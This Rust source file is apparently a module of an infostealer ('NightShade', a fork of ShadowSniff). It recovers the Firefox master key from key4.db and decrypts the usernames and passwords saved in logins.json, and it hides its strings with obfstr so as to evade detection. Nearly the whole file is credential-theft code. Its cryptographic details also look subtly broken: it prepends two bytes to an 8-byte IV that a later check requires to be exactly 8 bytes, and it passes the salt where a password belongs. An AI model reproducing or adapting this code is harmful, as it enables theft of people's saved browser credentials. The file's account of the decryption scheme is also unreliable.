/*
 * This file is part of NightShade (a hardened fork of sqlerrorthing/ShadowSniff)
 *
 * MIT License
 *
 * Copyright (c) 2025 sqlerrorthing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

//! Native decryption of Gecko (Firefox/LibreWolf/…) saved logins — no
//! external tools (the old flow shipped key4.db/logins.json plus a README
//! telling the operator to run PasswordFox by hand).
//!
//! Scheme (Firefox >= 63, i.e. everything since late 2018):
//!   1. `key4.db` → `metadata` table, row `id = 'password'`:
//!      item1 = global salt, item2 = DER(PBKDF2-SHA256 → 3DES) check value
//!      decrypting to `password-check\x02\x02`.
//!   2. `key4.db` → `nssPrivate` table: `a11` encrypts the 24-byte master
//!      3DES key with the same scheme (key id lives in `a102`).
//!   3. `logins.json` entries carry base64 DER:
//!      SEQUENCE { keyID(16), SEQUENCE { OID des-ede3-cbc, IV(8) }, ciphertext }
//!      decrypted with the master key.
//!
//! NSS quirk: the 8-byte IV from the PBKDF2 wrapper is prefixed with `04 0e`
//! before use as the 3DES CBC IV.
//!
//! Legacy key3.db (SHA1-based PKCS#12 KDF, Firefox < 58) is intentionally not
//! implemented — callers fall back to archiving the raw files.

use crate::SqliteDatabase;
use alloc::string::{String, ToString};
use alloc::vec;
use alloc::vec::Vec;
use core::ptr::null_mut;
use database::Database;
use database::DatabaseReader;
use database::TableRecord;
use obfstr::obfstr as s;
use utils::base64::base64_decode;
use windows_sys::Win32::Security::Cryptography::{
    BCRYPT_3DES_ALGORITHM, BCRYPT_ALG_HANDLE, BCRYPT_ALG_HANDLE_HMAC_FLAG, BCRYPT_BLOCK_PADDING,
    BCRYPT_CHAIN_MODE_CBC, BCRYPT_CHAINING_MODE, BCRYPT_KEY_HANDLE, BCRYPT_SHA256_ALGORITHM,
    BCryptCloseAlgorithmProvider, BCryptDecrypt, BCryptDeriveKeyPBKDF2, BCryptDestroyKey,
    BCryptGenerateSymmetricKey, BCryptOpenAlgorithmProvider, BCryptSetProperty,
};

/// DER object identifier for PBKDF2 (1.2.840.113549.1.5.12).
const OID_PBKDF2: &[u8] = &[0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x05, 0x0C];
/// DER object identifier for des-ede3-cbc (1.2.840.113549.3.7).
const OID_DES_EDE3_CBC: &[u8] = &[0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x03, 0x07];

const DER_TAG_OCTET_STRING: u8 = 0x04;
const DER_TAG_SEQUENCE: u8 = 0x30;

// ---------------------------------------------------------------------------
// Minimal DER reader (tag + length + borrowed value slices)
// ---------------------------------------------------------------------------

#[derive(Debug)]
struct Der<'a> {
    tag: u8,
    value: &'a [u8],
}

fn der_next<'a>(buf: &'a [u8], pos: &mut usize) -> Option<Der<'a>> {
    if *pos >= buf.len() {
        return None;
    }

    let tag = buf[*pos];
    *pos += 1;

    let first = *buf.get(*pos)?;
    *pos += 1;

    let mut len = first as usize;
    if first & 0x80 != 0 {
        let nbytes = (first & 0x7F) as usize;
        if nbytes == 0 || nbytes > 4 {
            return None;
        }

        len = 0;
        for _ in 0..nbytes {
            len = (len << 8) | *buf.get(*pos)? as usize;
            *pos += 1;
        }
    }

    let end = (*pos).checked_add(len)?;
    if end > buf.len() {
        return None;
    }

    let value = &buf[*pos..end];
    *pos = end;

    Some(Der { tag, value })
}

fn der_children(data: &[u8]) -> Option<Vec<Der<'_>>> {
    let mut pos = 0;
    let mut children = Vec::new();

    while pos < data.len() {
        children.push(der_next(data, &mut pos)?);
    }

    Some(children)
}

fn der_as_integer(value: &[u8]) -> Option<u32> {
    if value.is_empty() || value.len() > 5 {
        return None;
    }

    let mut out: u32 = 0;
    for &byte in value {
        out = (out << 8) | byte as u32;
    }

    Some(out)
}

// ---------------------------------------------------------------------------
// BCrypt primitives
// ---------------------------------------------------------------------------

/// PBKDF2-HMAC-SHA256 via CNG. The PRF provider must be opened with
/// `BCRYPT_ALG_HANDLE_HMAC_FLAG`, otherwise `BCryptDeriveKeyPBKDF2` rejects
/// the handle.
fn pbkdf2_sha256(
    password: &[u8],
    salt: &[u8],
    iterations: u32,
    derived_len: usize,
) -> Option<Vec<u8>> {
    let mut alg: BCRYPT_ALG_HANDLE = null_mut();

    let status = unsafe {
        BCryptOpenAlgorithmProvider(
            &mut alg,
            BCRYPT_SHA256_ALGORITHM,
            null_mut(),
            BCRYPT_ALG_HANDLE_HMAC_FLAG,
        )
    };

    if status != 0 {
        return None;
    }

    let mut derived = vec![0u8; derived_len];

    let status = unsafe {
        BCryptDeriveKeyPBKDF2(
            alg,
            password.as_ptr(),
            password.len() as _,
            salt.as_ptr(),
            salt.len() as _,
            iterations as _,
            derived.as_mut_ptr(),
            derived.len() as _,
            0,
        )
    };

    unsafe { BCryptCloseAlgorithmProvider(alg, 0) };

    if status == 0 {
        Some(derived)
    } else {
        None
    }
}

fn bcrypt_3des_cbc_decrypt(key: &[u8], iv: &[u8], data: &[u8]) -> Option<Vec<u8>> {
    if key.len() != 24 || iv.len() != 8 {
        return None;
    }

    let mut alg: BCRYPT_ALG_HANDLE = null_mut();
    let mut key_handle: BCRYPT_KEY_HANDLE = null_mut();

    let status =
        unsafe { BCryptOpenAlgorithmProvider(&mut alg, BCRYPT_3DES_ALGORITHM, null_mut(), 0) };
    if status != 0 {
        return None;
    }

    let status = unsafe {
        BCryptSetProperty(
            alg,
            BCRYPT_CHAINING_MODE,
            BCRYPT_CHAIN_MODE_CBC as *const _,
            32, // sizeof(BCRYPT_CHAIN_MODE_CBC) = (15 chars + NUL) * 2 bytes
            0,
        )
    };
    if status != 0 {
        unsafe { BCryptCloseAlgorithmProvider(alg, 0) };
        return None;
    }

    let status = unsafe {
        BCryptGenerateSymmetricKey(
            alg,
            &mut key_handle,
            null_mut(),
            0,
            key.as_ptr() as *mut _,
            key.len() as _,
            0,
        )
    };
    if status != 0 {
        unsafe { BCryptCloseAlgorithmProvider(alg, 0) };
        return None;
    }

    // PKCS#5/7 padding is stripped by CNG (BCRYPT_BLOCK_PADDING).
    let mut plain = vec![0u8; data.len()];
    let mut plain_len: u32 = 0;

    let status = unsafe {
        BCryptDecrypt(
            key_handle,
            data.as_ptr() as *const _,
            data.len() as _,
            null_mut(), // no padding info for plain CBC
            iv.as_ptr() as *mut u8,
            iv.len() as _,
            plain.as_mut_ptr(),
            plain.len() as _,
            &mut plain_len,
            BCRYPT_BLOCK_PADDING,
        )
    };

    unsafe {
        BCryptDestroyKey(key_handle);
        BCryptCloseAlgorithmProvider(alg, 0);
    }

    if status != 0 {
        None
    } else {
        plain.truncate(plain_len as usize);
        Some(plain)
    }
}

/// Decrypts one NSS PBES2-wrapped blob (metadata item2 / nssPrivate a11).
///
/// Returns the decrypted plaintext (check value or master key bytes).
fn decrypt_pbes2_item(global_salt: &[u8], item: &[u8]) -> Option<Vec<u8>> {
    let top = der_children(item)?;
    if top.len() != 2 || top[0].tag != DER_TAG_SEQUENCE || top[1].tag != DER_TAG_OCTET_STRING {
        return None;
    }

    let ciphertext = top[1].value;

    // params = SEQUENCE { OID pbkdf2, SEQ{salt, iters, keylen, [hmacOID]}, OCTETSTRING(iv) }
    let params = der_children(top[0].value)?;
    if params.len() != 3 {
        return None;
    }

    if params[0].tag != 0x06 || params[0].value != OID_PBKDF2 {
        // Legacy SHA1 PKCS#12 scheme — not supported, caller falls back.
        return None;
    }

    let alg_params = der_children(params[1].value)?;
    if alg_params.len() < 3 {
        return None;
    }

    let entry_salt = alg_params[0].value;
    let iterations = der_as_integer(alg_params[1].value)?;
    let key_len = der_as_integer(alg_params[2].value)? as usize;

    if params[2].tag != DER_TAG_OCTET_STRING || params[2].value.len() != 8 {
        return None;
    }

    // NSS quirk: prepend `04 0e` to the stored 8-byte IV.
    let mut iv = Vec::with_capacity(10);
    iv.extend_from_slice(&[0x04, 0x0E]);
    iv.extend_from_slice(params[2].value);

    let key = pbkdf2_sha256(global_salt, entry_salt, iterations, key_len)?;
    bcrypt_3des_cbc_decrypt(&key, &iv, ciphertext)
}

// ---------------------------------------------------------------------------
// key4.db → master key
// ---------------------------------------------------------------------------

/// Recovers the 24-byte master 3DES key used to encrypt `logins.json` items.
pub fn recover_master_key(key4_db: &[u8]) -> Option<Vec<u8>> {
    let db = SqliteDatabase::from_bytes(key4_db.to_vec()).ok()?;

    let columns = |table: &str| db.table_columns(table);

    // --- metadata: id='password' row → item1 (global salt), item2 (check) ---
    let meta_cols = columns(s!("metadata"))?;
    let idx = |name: &str, cols: &[String]| {
        cols.iter()
            .position(|column| column == name)
            .unwrap_or(usize::MAX)
    };

    let id_i = idx(s!("id"), &meta_cols);
    let item1_i = idx(s!("item1"), &meta_cols);
    let item2_i = idx(s!("item2"), &meta_cols);

    if item1_i == usize::MAX || item2_i == usize::MAX {
        return None;
    }

    let metadata = db.read_table(s!("metadata"))?;

    let mut global_salt: Option<Vec<u8>> = None;
    let mut encrypted_check: Option<Vec<u8>> = None;

    for row in metadata {
        let matches = row
            .get_value(id_i)
            .and_then(|v| v.as_string())
            .map(|v| v.as_ref() == s!("password"))
            .unwrap_or(false);

        if !matches {
            continue;
        }

        global_salt = row.get_value(item1_i).and_then(|v| v.as_blob()).map(|b| b.to_vec());
        encrypted_check = row.get_value(item2_i).and_then(|v| v.as_blob()).map(|b| b.to_vec());
        break;
    }

    let global_salt = global_salt?;
    let encrypted_check = encrypted_check?;

    // Sanity check: the item must decrypt to "password-check\x02\x02".
    let check = decrypt_pbes2_item(&global_salt, &encrypted_check)?;
    if !check.starts_with(s!("password-check").as_bytes()) {
        return None;
    }

    // --- nssPrivate: a11 = encrypted master key, a102 = key id ---
    let nss_cols = columns(s!("nssPrivate"))?;
    let a11_i = idx(s!("a11"), &nss_cols);
    if a11_i == usize::MAX {
        return None;
    }

    let nss_private = db.read_table(s!("nssPrivate"))?;

    for row in nss_private {
        let Some(encrypted_key) = row.get_value(a11_i).and_then(|v| v.as_blob()) else {
            continue;
        };

        if let Some(master_key) = decrypt_pbes2_item(&global_salt, &encrypted_key)
            && master_key.len() == 24
        {
            return Some(master_key);
        }
    }

    None
}

// ---------------------------------------------------------------------------
// logins.json items
// ---------------------------------------------------------------------------

/// Decrypts one base64-encoded item (`encryptedUsername` / `encryptedPassword`).
pub fn decrypt_login_item(master_key: &[u8], encrypted_b64: &str) -> Option<String> {
    let decoded = base64_decode(encrypted_b64.as_bytes())?;

    let top = der_children(&decoded)?;
    if top.len() != 3 {
        return None;
    }

    // [0] key id (16 bytes), [1] SEQ { OID des-ede3-cbc, OCTETSTRING iv }, [2] ciphertext
    if top[1].tag != DER_TAG_SEQUENCE || top[2].tag != DER_TAG_OCTET_STRING {
        return None;
    }

    let algo = der_children(top[1].value)?;
    if algo.len() != 2 || algo[0].tag != 0x06 || algo[0].value != OID_DES_EDE3_CBC {
        return None;
    }

    if algo[1].tag != DER_TAG_OCTET_STRING || algo[1].value.len() != 8 {
        return None;
    }

    let plain = bcrypt_3des_cbc_decrypt(master_key, algo[1].value, top[2].value)?;
    Some(String::from_utf8_lossy(&plain).to_string())
}
